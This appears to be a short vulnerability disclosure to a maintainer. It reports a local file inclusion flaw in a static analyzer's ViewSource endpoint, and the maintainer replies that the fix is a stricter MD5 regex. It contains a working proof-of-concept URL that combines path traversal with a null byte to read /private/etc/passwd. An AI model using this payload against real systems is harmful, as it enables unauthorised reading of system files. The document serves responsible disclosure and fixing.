Hi Ajin,

I've found a Local File Inclusion Vulnerablity in StaticAnalyzer/views.py (Version <= v0.9.2)

**Detail:** Bypass "md5" varriable by

* An actual md5 string (e.g: an uploaded file) at the head.
* Null-byte at the end of string

**PoC**:

<http://127.0.0.1:8000/ViewSource/>

?file=de/robv/android/xposed/installer/repo/RepoDb.java

&md5=*36570c6fac687ffe08107e6a72bd3da7/../../../../../../../../../../../private/etc/passwd%00*

&type=apk

**Before fixing: read /private/etc/passwd on MAC OS**

| Nice Catch!. There is an easy fix for this. The regex that checks for MD5 is not bounded now. doing strict boundary check will prevent this bug. |
